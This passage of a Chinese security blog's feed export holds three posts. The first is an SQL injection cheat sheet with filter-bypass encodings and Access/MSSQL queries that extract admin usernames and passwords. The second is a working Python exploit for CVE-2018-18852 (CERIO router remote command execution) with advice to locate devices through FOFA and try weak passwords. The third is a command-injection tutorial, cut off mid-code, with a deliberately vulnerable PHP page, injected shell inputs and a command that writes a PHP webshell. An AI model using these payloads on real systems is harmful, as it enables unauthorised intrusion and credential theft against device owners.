class="line">L(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,5</span><br><span class="line">8)), NULL, NULL#/*!0AND &apos;QDWa&apos;=&apos;QDWa</span><br><span class="line">SELECT * FROM users WHERE id LIKE 1</span><br><span class="line">SELECT FIELD%20FROM TABLE 可以写成</span><br><span class="line">%u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u004</span><br><span class="line">4%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045</span><br><span class="line">&apos;A&gt; B&apos;可以写成 &apos;ANOT BETWEEN 0 AND B&apos;</span><br><span class="line">1&apos; AND SLEEP(5)# 可以写成 MScgQU5EIFNMRUVQKDUpIw==</span><br><span class="line">AND &apos;1&apos;=&apos;1&apos; 可以写成 AND %EF%BC%871%EF%BC%87=%EF%BC%871%EF%BC%87</span><br><span class="line">load_file/*foo*/(0×616263)</span><br><span class="line">http://localhost/sqli.php?id=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1</span><br><span class="line">%2C2%2Ccurrent_user</span><br><span class="line">http;//127.0.0.1/1.asp?id=(1)anandd(1=1)</span><br><span class="line">试试不要用 /etc/passwd. 用 /foo/../etc/bar/../passwd.</span><br><span class="line">Dumpfile 虽然只能导出一行数据，但必要时还是应该可以拿来和 outfile 换一下的</span><br><span class="line"></span><br><span class="line">一些mysql函数</span><br><span class="line">substr(‘abc’,1,1) = ‘a’</span><br><span class="line">substr(‘abc’ from 1 for 1) = ‘a’</span><br><span class="line">substring(‘abc’,1,1) = ‘a’</span><br><span class="line">substring(‘abc’ from 1 for 1) = ‘a’</span><br><span class="line">mid(‘abc’,1,1) = ‘a’</span><br><span class="line">mid(‘abc’ from 1 for 1) = ‘a’</span><br><span class="line">lpad(‘abc’,1,space(1)) = ‘a’</span><br><span class="line">rpad(‘abc’,1,space(1)) = ‘a’</span><br><span class="line">left(‘abc’,1) = ‘a’</span><br><span class="line">reverse(right(reverse(‘abc’),1)) = ‘a’</span><br><span class="line">insert(insert(‘abc’,1,0,space(0)),2,222,space(0)) = ‘a’</span><br><span class="line">space(0) = trim(version()from(version()))</span><br><span class="line">locate(‘a’,&apos;abc’)</span><br><span class="line">position(‘a’,&apos;abc’)</span><br><span class="line">position(‘a’ IN ‘abc’)</span><br><span class="line">instr(‘abc’,&apos;a’)</span><br><span class="line">substring_index(‘ab’,&apos;b’,1)</span><br><span class="line">length(trim(leading ‘a’ FROM ‘abc’))</span><br><span class="line">length(replace(‘abc’, ‘a’, ”))</span><br><span class="line">strcmp(‘a’,&apos;a’)</span><br><span class="line">mod(‘a’,&apos;a’)</span><br><span class="line">find_in_set(‘a’,&apos;a’)</span><br><span class="line">field(‘a’,&apos;a’)</span><br><span class="line">count(concat(‘a’,&apos;a’))</span><br><span class="line">length()</span><br><span class="line">bit_length()</span><br><span class="line">char_length()</span><br><span class="line">octet_length()</span><br><span class="line">bit_count()</span><br><span class="line"></span><br><span class="line">姿势大全</span><br><span class="line">新姿势 1:</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x69) = 1</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x70) = 0</span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x71) = -1</span><br><span class="line">变换姿势: /*mid()函数用于得到字符串的一部分*/</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1)=&apos;*&apos;  //获取user表中字段的&apos;user&apos;然后输出字段内容里面有个*的</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1)=0x2a</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1)=unhex(&apos;2a&apos;)</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1) regexp &apos;[*]&apos;</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1) like &apos;*&apos;</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR mid(password,1,1) rlike &apos;[*]&apos;</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR ord(mid(password,1,1))=42</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR ascii(mid(password,1,1))=42</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR find_in_set(&apos;2a&apos;,hex(mid(password,1,1)))=1</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR position(0x2a in password)=1</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR locate(0x2a,password)=1</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR substr(password,1,1)=0x2a</span><br><span class="line">select user from mysql.user where user = &apos;user&apos; OR substring(password,1,1)=0x2a</span><br><span class="line">新姿势 2:</span><br><span class="line">false !pi() 0 ceil(pi()*pi()) 10 A ceil((pi()+pi())*pi()) 20 K</span><br><span class="line">true !!pi() 1 ceil(pi()*pi())+true 11 B ceil(ceil(pi())*version()) 21 L</span><br><span class="line">true+true 2 ceil(pi()+pi()+version()) 12 C ceil(pi()*ceil(pi()+pi())) 22 M</span><br><span class="line">floor(pi()) 3 floor(pi()*pi()+pi()) 13 D ceil((pi()+ceil(pi()))*pi()) 23 N</span><br><span class="line">ceil(pi()) 4 ceil(pi()*pi()+pi()) 14 E ceil(pi())*ceil(version()) 24 O</span><br><span class="line">floor(version()) 5 ceil(pi()*pi()+version()) 15 F floor(pi()*(version()+pi())) 25 P</span><br><span class="line">ceil(version()) 6 floor(pi()*version()) 16 G floor(version()*version()) 26 Q</span><br><span class="line">ceil(pi()+pi()) 7 ceil(pi()*version()) 17 H ceil(version()*version()) 27 R</span><br><span class="line">floor(version()+pi()) 8 ceil(pi()*version())+true 18 I ceil(pi()*pi()*pi()-pi()) 28 S</span><br><span class="line">floor(pi()*pi()) 9 floor((pi()+pi())*pi()) 19 J floor(pi()*pi()*floor(pi())) 29 T</span><br></pre></td></tr></table></figure></p><p>其他数据库类型注入：<br>ACCESS注入语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">and exists(<span class="keyword">select</span> * <span class="keyword">from</span> msysobjects) <span class="comment">/*返回错误页面或返回无权限读取代表是Access数据库*/</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="comment">/*admin为表名，让你猜表名*/</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="comment">/*username为列名,让你猜列名*/</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">8</span> <span class="comment">/*猜解字段长度*/</span></span><br><span class="line">将<span class="keyword">id</span>改为<span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="keyword">from</span> <span class="keyword">admin</span> <span class="comment">/*获取位置*/</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,<span class="keyword">password</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="keyword">from</span> <span class="keyword">admin</span> <span class="comment">/*读字段*/</span></span><br></pre></td></tr></table></figure></p><p>ACCESS盲注:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">判断是否有注入就不说了</span><br><span class="line">and exists(<span class="keyword">select</span> * <span class="keyword">from</span> msysobjects) <span class="comment">/*500状态码或报无权限读取代表是Access数据库*/</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="comment">/*admin是你要猜解的表名*/</span></span><br><span class="line"><span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="comment">/*username是你要猜解的列名*/</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">len</span>(username) <span class="keyword">from</span> <span class="keyword">admin</span>)&gt;<span class="number">1</span> <span class="comment">/*top 1 len(你要猜解列名的长度),1代表长度,直到报错的第一个*/</span></span><br><span class="line">例子：</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top1 <span class="keyword">len</span>(username) <span class="keyword">from</span> <span class="keyword">admin</span>)&gt;<span class="number">4</span> <span class="comment">/*正确*/</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">len</span>(username) <span class="keyword">from</span> <span class="keyword">admin</span>)&gt;<span class="number">5</span> <span class="comment">/*错误*/</span> 那么长度为<span class="number">5</span>，第一个错误就是长度</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span>(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(<span class="keyword">mid</span>(username,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> <span class="keyword">admin</span>)=<span class="number">97</span> <span class="comment">/*username为你要猜解的列名，1为长度，如果上一步为5这里最高是5,97位ascii码,通过ascii来猜解字段*/</span></span><br></pre></td></tr></table></figure></p><p>MSSQL注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">mssql是sql server，也是微软推出的大型数据库。</span><br><span class="line"></span><br><span class="line">MSSQL权限:</span><br><span class="line">sa权限:数据库管理，文件管理，命令执行，注册表，system</span><br><span class="line"></span><br><span class="line">db权限:文件管理，数据库操作等，users-administrators</span><br><span class="line"></span><br><span class="line">public权限:</span><br><span class="line">数据库操作， guest-users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注入语句:</span><br><span class="line">判断有没有注入</span><br><span class="line">'</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">初步判断是否mssql</span><br><span class="line">and user&gt;0</span><br><span class="line">判断数据库系统</span><br><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*)<span class="keyword">from</span> sysobjects)&gt;<span class="number">0</span> //mssql</span><br><span class="line">注释:诺是报错或者权限不足无法查看就是mssql数据库了</span><br><span class="line"></span><br><span class="line">查看数据库版本信息：<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> @@<span class="keyword">version</span>)</span><br><span class="line">查看数据库的语句：<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> db_name())</span><br><span class="line">获取第一个用户数据库：<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> bdid&gt;<span class="number">4</span>)</span><br><span class="line">获取下一个数据库：<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">master</span> ..sysdatabases <span class="keyword">where</span> bdid&gt;<span class="number">4</span> <span class="keyword">and</span> <span class="keyword">name</span>&lt;&gt;<span class="string">'数据库名'</span>) //以此类推可以获取全部数据库名</span><br><span class="line"></span><br><span class="line">获取表：<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span></span><br><span class="line">获取第二张表: <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xype=<span class="string">'||'</span> <span class="keyword">and</span> <span class="keyword">name</span> &lt;&gt; <span class="string">'第一张表名'</span>)</span><br><span class="line">获取第三张表：<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xyoe=<span class="string">'||'</span> <span class="keyword">and</span> <span class="keyword">name</span> &lt;&gt; <span class="string">'第一张表名'</span> <span class="keyword">and</span> <span class="keyword">name</span> &lt;&gt; <span class="string">'第二张表名'</span>)</span><br><span class="line">获取N张表以此类推可以获取所有表。。。</span><br><span class="line"></span><br><span class="line">获取某表的列名：<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> syscolumns <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'表名'</span>))</span><br><span class="line">获取第二个列名：<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> syscolumns <span class="keyword">where</span> <span class="keyword">id</span>=(<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'表名'</span>)) <span class="keyword">and</span> <span class="keyword">name</span> &lt;&gt; <span class="string">'第一个列名'</span></span><br><span class="line">获取N个列名以此类推可以获取所有列名。。。</span><br><span class="line"></span><br><span class="line">获取列里面的数据：<span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> 列名 <span class="keyword">from</span> 表名 )</span><br><span class="line">要查询其他的改为对应的就ok</span><br></pre></td></tr></table></figure></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2018-18852 recurrence</title>
      <link href="/posts/4e5e3ee5.html"/>
      <url>/posts/4e5e3ee5.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个洞出来也有几天了，详情自行google。这里我手动撸了一个py3的脚本，github上的exp是py2写的<br><img src="http://p3.pstatp.com/large/pgc-image/152580921656618a2da3aff" alt="152580921656618a2da3aff"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>漏洞详情：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18852" target="_blank" rel="noopener">CVE - CVE-2018-18852</a><br>exp：<a href="https://github.com/hook-s3c/CVE-2018-18852" target="_blank" rel="noopener">GitHub - hook-s3c/CVE-2018-18852: CERIO RCE CVE-2018-18852, authenticated (vendor defaults) web-based RCE as root user.</a><br>利用方法：上fofa搜关键字：CERIO DT-300N，尝试弱口令，然后如果是弱口令的话扔exp里面执行<br>声明：如果你想蹲监的话，本人不负责</p><p><b>exp脚本分析</b><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.首先判断是cerio的那个版本</span><br><span class="line">2.确定版本后获取PID值</span><br><span class="line">3.构造一个payload远程执行命令</span><br></pre></td></tr></table></figure></p><p>随便找一个是弱口令的IP<br><img src="https://s2.ax1x.com/2019/01/30/klt8v6.png" alt="klt8v6.png"></p><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">#author:九世</span><br><span class="line">#time:2019/1/30</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">class Demo:</span><br><span class="line">    def __init__(self,headers,url,payload,url2):</span><br><span class="line">        self.headers=headers</span><br><span class="line">        self.url=url</span><br><span class="line">        self.payload=payload</span><br><span class="line">        self.url2=url2</span><br><span class="line"></span><br><span class="line">    def requet(self):</span><br><span class="line">        ver = &apos;DT-300N-NGS-M&apos;</span><br><span class="line">        ver2=&apos;DT-300N&apos;</span><br><span class="line">        version=&apos;&apos;</span><br><span class="line">        vurl=&apos;&apos;</span><br><span class="line">        rqt=requests.post(url=self.url,headers=self.headers,data=self.payload)</span><br><span class="line">        nurl=&apos;&apos;</span><br><span class="line">        nersion=&apos;&apos;</span><br><span class="line">        if rqt.status_code==requests.codes.ok:</span><br><span class="line">            print(&apos;[+] Router version number is &#123;&#125;&apos;.format(ver))</span><br><span class="line">            while True:</span><br><span class="line">                rqt = requests.post(url=self.url, headers=self.headers, data=self.payload)</span><br><span class="line">                nurl+=rqt.url</span><br><span class="line">                nersion+=ver</span><br><span class="line">                nary=json.loads(rqt.content)</span><br><span class="line">                cmd = input(&apos;command：&apos;)</span><br><span class="line">                payload = &#123;&apos;ip&apos;: &apos;127.0.0.1;&apos; + &apos;echo &quot;[[[&quot;;&apos; + cmd, &apos;pid&apos;: nary[&apos;pid&apos;], &apos;Times&apos;: 1&#125;</span><br><span class="line">                self.command(self.url, headers, payload,nersion)</span><br><span class="line"></span><br><span class="line">        elif rqt.status_code==requests.codes.not_found: #判断状态码是否为404</span><br><span class="line">            print(&apos;[-] Router version number is not &#123;&#125;&apos;.format(ver))</span><br><span class="line">            rqts=requests.post(url=self.url2,headers=headers,data=self.payload)</span><br><span class="line">            if rqts.status_code==requests.codes.ok:</span><br><span class="line">                print(&apos;[+] Router version number is &#123;&#125;&apos;.format(ver2))</span><br><span class="line">                while True:</span><br><span class="line">                    rqts = requests.post(url=self.url2, headers=headers, data=self.payload)</span><br><span class="line">                    version+=ver2</span><br><span class="line">                    vurl+=rqts.url</span><br><span class="line">                    vary=json.loads(rqts.content)</span><br><span class="line">                    cmd=input(&apos;command：&apos;)</span><br><span class="line">                    payload = &#123;&apos;ip&apos;: &apos;127.0.0.1;&apos; + &apos;echo &quot;[[[&quot;;&apos; + cmd, &apos;pid&apos;: vary, &apos;Times&apos;: 1&#125;</span><br><span class="line">                    self.command(self.url2,headers,payload,version)</span><br><span class="line">            elif rqts.status_code==requests.codes.not_found:</span><br><span class="line">                print(&apos;[-] Router version number is not &#123;&#125;&apos;.format(ver2))</span><br><span class="line">                exit()</span><br><span class="line">            elif rqts.status_code==requests.codes.unauthorized:</span><br><span class="line">                print(&apos;[-] Auth is invalid, try other creds&apos;)</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">    def command(self,url,header,data,ver):</span><br><span class="line">        rsv=requests.post(url=url,headers=header,data=data)</span><br><span class="line">        if ver==&apos;DT-300N&apos;:</span><br><span class="line">            print(rsv.text.split(&apos;/html&apos;)[1])</span><br><span class="line">        else:</span><br><span class="line">            print(rsv.text.split(&apos;[[[&apos;)[1])</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    print(&apos;[&amp;]&apos;)</span><br><span class="line">    print(&apos;[!] CERIO DT-300N-NGS-M\n[!] CERIO DT-300N&apos;)</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    t=&apos;&apos;</span><br><span class="line">    path=&apos;/cgi-bin/main.cgi?cgi=PING&amp;mode=9&apos;</span><br><span class="line">    path2=&apos;/cgi-bin/Save.cgi?cgi=PING&apos;</span><br><span class="line">    user=input(&apos;host:&apos;).strip()</span><br><span class="line">    ports=input(&apos;port:&apos;).strip()</span><br><span class="line">    username=input(&apos;creds:&apos;).strip()</span><br><span class="line">    creds=bytes(base64.b64encode(bytes(username,encoding=&apos;utf-8&apos;))).decode(&apos;utf-8&apos;)</span><br><span class="line">    if ports in &apos;443&apos;:</span><br><span class="line">        t+=&apos;https://&apos;</span><br><span class="line">    else:</span><br><span class="line">        t+=&apos;http://&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    urls=t+user+&apos;:&apos;+ports+path</span><br><span class="line">    urls2=t+user+&apos;:&apos;+ports+path2</span><br><span class="line">    payload=&#123;&apos;cgi&apos;:&apos;PING&apos;,&apos;mode&apos;:9&#125;</span><br><span class="line">    headers=&#123;&apos;content-type&apos;: &apos;application/json&apos;, &apos;Host&apos;: user, &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,&apos;Content-Length&apos;: &apos;0&apos;, &apos;Connection&apos;: &apos;keep-alive&apos;, &apos;Authorization&apos;: &apos;Basic &#123;&#125;&apos;.format(creds)&#125;</span><br><span class="line">    obj=Demo(headers=headers,payload=payload,url=urls,url2=urls2)</span><br><span class="line">    obj.requet()</span><br></pre></td></tr></table></figure></p><p>测试：<br><img src="https://s2.ax1x.com/2019/01/30/kltYDO.png" alt="kltYDO.png"></p><p><img src="https://s2.ax1x.com/2019/01/30/klt0PA.md.png" alt="klt0PA.md.png"></p><p>脚本地址：<a href="https://github.com/422926799/python/tree/master/CVE-2018-18852" target="_blank" rel="noopener">python/CVE-2018-18852 at master · 422926799/python · GitHub</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Command injection summary</title>
      <link href="/posts/e2532565.html"/>
      <url>/posts/e2532565.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天把系统重装了一遍，起因经过不想说什么= =。由于下午都在安环境和打补丁，也就只有晚上能学习一下。把命令注入学习总结了一遍<br><img src="http://img.mp.itc.cn/upload/20170204/e5391a3c2cf145b18b5c6b56b7930b20_th.jpeg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p><b>漏洞产生的原因</b><br>由于开发人员使用脚本语言提供的命令执行操作，过滤又不完善用户又可以只有控制输入的变量。导致了变量可控，造成命令注入。</p><p><b>漏洞测试</b><br>测试环境为：win7+php5.6,使用phpstudy搭建<br>存在漏洞的脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;命令注入测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;输入IP&lt;/p&gt;</span><br><span class="line">&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;];?&gt;&quot;&gt;</span><br><span class="line">    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type: text/html;charset=utf-8&quot;);</span><br><span class="line">if(isset($_GET[&apos;host&apos;]))&#123;</span><br><span class="line">    $ud=$_GET[&apos;host&apos;];</span><br><span class="line">    $zx=system(&quot;ping &quot;.$ud);</span><br><span class="line">    echo $zx;</span><br><span class="line">    echo &quot;&lt;script&gt;document.getElementById(&apos;demo&apos;).innerText=$zx&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>上面这个例子可以看到无任何过滤，输入变量又可控，导致可以被用户任意执行命令<br><img src="https://s2.ax1x.com/2019/01/29/kQ4lSP.png" alt="kQ4lSP.png"><br>输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;dir</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/29/kQ40S0.md.png" alt="kQ40S0.md.png"><br>查看权限：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/29/kQ4TmD.png" alt="kQ4TmD.png"></p><p>反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @assert($_GET[_]);?&gt;&quot; &gt;&gt; zz.php</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/01/29/kQ57vV.png" alt="kQ57vV.png"></p><p><img src="https://s2.ax1x.com/2019/01/29/kQ5zCR.png" alt="kQ5zCR.png"></p><p><b>绕过过滤</b><br>一些程序员为了防止这种情况的发生，进行了一定的过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;命令注入测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;输入IP&lt;/p&gt;</span><br><span class="line">&lt;form method=&quot;GET&quot; action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;];?&gt;&quot;&gt;</span><br><span class="line">    IP:&lt;input name=&quot;host&quot; type=&quot;text&quot; required&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">    &lt;p id=&quot;demo&quot;&gt;我是结果&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type: 